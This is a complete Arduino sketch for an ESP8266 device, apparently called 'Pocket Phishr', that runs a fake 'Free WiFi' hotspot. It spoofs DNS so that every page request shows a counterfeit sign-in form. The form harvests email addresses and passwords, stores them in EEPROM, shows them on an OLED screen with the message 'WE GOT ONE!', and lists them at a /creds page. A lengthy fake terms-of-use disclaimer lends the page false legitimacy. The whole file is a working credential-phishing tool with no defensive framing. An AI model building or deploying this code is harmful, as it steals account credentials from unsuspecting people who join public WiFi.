// ESP8266 WiFi Captive Portal
// https://github.com/adamff1/ESP8266_WiFi_Captive_Portal_2.0


// IDEAS

// investigate best battery
// aerial upgrade or power change to increase distance?




// Includes
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <Adafruit_GFX.h>  // needs to be v1.6.1 to avoid crash
#include <ESP8266WebServer.h>

#include <U8g2lib.h>
#include <Wire.h>
#include <Scheduler.h> // neeed?
#include <EEPROM.h>

// Default SSID name
const char* SSID_NAME = "Free WiFi";


#define SUBTITLE "Free WiFi Service."
#define TITLE "Sign in:"
#define BODY "Create an account to get connected to the internet."
#define POST_TITLE "Validating..."
#define POST_BODY "Your account is being validated. Please, wait up to 2 minutes for device connection.</br>Thank you."
#define PASS_TITLE "Credentials"
#define CLEAR_TITLE "Cleared"



// needed for oled
U8G2_SSD1306_128X64_NONAME_F_SW_I2C u8g2(U8G2_R0, /* clock=*/14, /* data=*/12, /* reset=*/U8X8_PIN_NONE);  // ESP32 Thing, pure SW emulated I2C


// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1);  // Gateway

String allCredentials = "";
String newSSID = "";
String currentSSID = "";

// For storing passwords in EEPROM.
int initialCheckLocation = 20;  // Location to check whether the ESP is running for the first time.
int passStart = 30;             // Starting location in EEPROM to save password.
int passEnd = passStart;        // Ending location in EEPROM to save password.


unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}



String footer() {
  return "<br><b>Welcome to our free Wi-Fi network! Before accessing and using our network, please read and understand the following disclaimer:</b><br><br><small><p><p>Acceptance of Terms:<p>By accessing and using our free Wi-Fi network, you agree to the terms and conditions outlined in this disclaimer. If you do not agree with any part of this disclaimer, please refrain from using the network.<p><p>Network Usage:<p>Our free Wi-Fi network is provided as a convenience to our guests and should be used responsibly. You are solely responsible for any activities you engage in while using the network, including but not limited to browsing the internet, accessing websites, and downloading files. You must comply with all applicable laws and regulations.<p><p>Security Risks:<p>Please be aware that using any public Wi-Fi network carries inherent security risks. Although we strive to provide a secure network, we cannot guarantee the confidentiality or integrity of your data while using our Wi-Fi network. Exercise caution when accessing sensitive information or transmitting personal data over the network.<p><p>Malicious Content:<p>Our network is protected with security measures to prevent malicious content, but we cannot guarantee its complete effectiveness. It is your responsibility to maintain your devices' security by using up-to-date antivirus software and keeping your operating systems and applications patched.<p><p>Limitations:<p>Our free Wi-Fi network is provided on an as-is basis, without any warranties or guarantees of any kind, whether express or implied. We do not guarantee the availability, speed, or reliability of the network. We reserve the right to suspend or terminate access to the network at any time without prior notice.<p><p>Privacy:<p>While using our network, we may collect certain information, such as your devices MAC address and IP address, for network management and security purposes. We will handle this information in accordance with our privacy policy.<p><p>Liability:<p>We shall not be held liable for any direct, indirect, incidental, consequential, or punitive damages arising out of or in connection with your use of our free Wi-Fi network. This includes, but is not limited to, any damages caused by viruses, data breaches, or unauthorized access to your devices.<p><p>Acceptable Use:<p>You must use our free Wi-Fi network in a manner consistent with acceptable use policies. Engaging in any illegal, unethical, or disruptive activities is strictly prohibited.<p><p>By accessing and using our free Wi-Fi network, you acknowledge that you have read, understood, and agreed to this disclaimer. If you have any questions or concerns, please contact our staff for assistance.</small><p><p></div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String header(String t) {
  String a = String(currentSSID);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; background-color: ghostwhite;}"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: BLACK; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title>"
             + a + " :: " + t + "</title>"
                                "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
                                "<style>"
             + CSS + "</style></head>"
                     "<body><nav><b>"
             + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}


String creds() {
  return header(PASS_TITLE) + "<ol>" + allCredentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>";
}


String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" + "<b>Email:</b> <center><input type=text autocomplete=email name=email></input></center>" + "<b>Password:</b> <center><input type=password name=password></input><input type=submit value=\"Sign in\"></form></center>" + footer();
}






bool hasClicked = false;



String posted() {
  String email = input("email");
  String password = input("password");
  String newCredential = "";
  newCredential = "<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>";
  allCredentials += newCredential; // add new creds to all

    // Storing passwords to EEPROM.
    for (int i = 0; i <= newCredential.length(); ++i) {
    EEPROM.write(passEnd + i, newCredential[i]);  // Adding password to existing password in EEPROM.
  }

  passEnd += newCredential.length();  // Updating end position of passwords in EEPROM.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();




  Serial.println("hasSentCreds");
  hasClicked = true;  // used to tell scroll to stop
  u8g2.begin();
  u8g2.clearBuffer();  // clear the internal memory
  u8g2.clearDisplay();

  u8g2.setFont(u8g2_font_likeminecraft_te);  // choose a suitable font
  u8g2.setCursor(23, 15);
  u8g2.print("** WE GOT ONE! **");
  u8g2.setCursor(0, 27);
  u8g2.print("Email:");
  u8g2.setCursor(0, 37);
  u8g2.print(email);
  u8g2.setCursor(0, 52);
  u8g2.print("Password:");
  u8g2.setCursor(0, 62);
  u8g2.print(password);
  u8g2.sendBuffer();  // transfer internal memory to the display
  return header(POST_TITLE) + POST_BODY;
}




String clear() {
  allCredentials = "";
  passEnd = passStart;  // Setting the password end location -> starting position.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(CLEAR_TITLE) + "<div><p>The password list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>";
}


String ssid() {
  return header("Change SSID") + "<p>Here you can change the SSID name. After pressing the button \"Change SSID\" you will lose the connection, so reconnect to the new SSID.</p>" + "<form action=/postSSID method=post><label>New SSID name:</label>" + "<input type=text name=s></input><input type=submit value=\"Change SSID\"></form>";
}


String postedSSID() {
  String postedSSID = input("s");
  newSSID = "<li><b>" + postedSSID + "</b></li>";
  for (int i = 0; i < postedSSID.length(); ++i) {
    EEPROM.write(i, postedSSID[i]);
  }
  EEPROM.write(postedSSID.length(), '\0');
  EEPROM.commit();
  WiFi.softAP(postedSSID);
  return header("Posted SSID") + newSSID + footer();
}

//================================================================

u8g2_uint_t offset;                                         // current offset for the scrolling text
u8g2_uint_t width;                                          // pixel width of the scrolling text (must be lesser than 128 unless U8G2_16BIT is defined
const char *text = "Sit back, relax. The bait is set....";  //There's plenty of phish in the sea....Time spent phishing is never wasted....A bad day of phishing is still better than a good day at work....";	// scroll this text from right to left





void setup() {
  // Serial begin
  Serial.begin(115200);

  bootTime = lastActivity = millis();
  EEPROM.begin(512);
  delay(10);

  // Check whether the ESP is running for the first time.
  String checkValue = "first";  // This will will be set in EEPROM after the first run.

  for (int i = 0; i < checkValue.length(); ++i) {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i]) {
      // Add "first" in initialCheckLocation.
      for (int i = 0; i < checkValue.length(); ++i) {
        EEPROM.write(i + initialCheckLocation, checkValue[i]);
      }
      EEPROM.write(0, '\0');          // Clear SSID location in EEPROM.
      EEPROM.write(passStart, '\0');  // Clear password location in EEPROM
      EEPROM.commit();
      break;
    }
  }

  // Read EEPROM SSID
  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0') {
    ESSID += char(EEPROM.read(i));
    i++;
  }

  // Reading stored password and end location of passwords in the EEPROM.
  while (EEPROM.read(passEnd) != '\0') {
    allCredentials += char(EEPROM.read(passEnd));  // Reading the store password in EEPROM.
    passEnd++;                              // Updating the end location of password in EEPROM.
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));

  // Setting currentSSID -> SSID in EEPROM or default one.
  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;

  Serial.print("Current SSID: ");
  Serial.print(currentSSID);
  WiFi.softAP(currentSSID);



  // Start webserver
  dnsServer.start(DNS_PORT, "*", APIP);  // DNS spoofing (Only HTTP)
  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html", posted());
  });
  webServer.on("/creds", []() {
    webServer.send(HTTP_CODE, "text/html", creds());
  });
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });
  webServer.on("/ssid", []() {
    webServer.send(HTTP_CODE, "text/html", ssid());
  });
  webServer.on("/postSSID", []() {
    webServer.send(HTTP_CODE, "text/html", postedSSID());
  });

  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index());
  });
  webServer.begin();




  // display static home screen
  u8g2.begin();
  u8g2.clearBuffer();                 // clear the internal memory
  u8g2.setFontMode(0);  // enable transparent mode, which is faster


  u8g2.setFont(u8g2_font_likeminecraft_te);
  u8g2.setCursor(5, 10);
  u8g2.print("SSID: " + currentSSID);  // this value must be lesser than 128 unless U8G2_16BIT is set
  u8g2.setCursor(7, 35);
  u8g2.setFont(u8g2_font_bubble_tr);
  u8g2.print("Pocket");  // this value must be lesser than 128 unless U8G2_16BIT is set
  u8g2.setCursor(11, 62);
  u8g2.print("Phishr");
  u8g2.sendBuffer();  // transfer internal memory to the display
}




void loop(void) {
  if ((millis() - lastTick) > TICK_TIMER) { lastTick = millis(); }
  dnsServer.processNextRequest();
  webServer.handleClient();
}
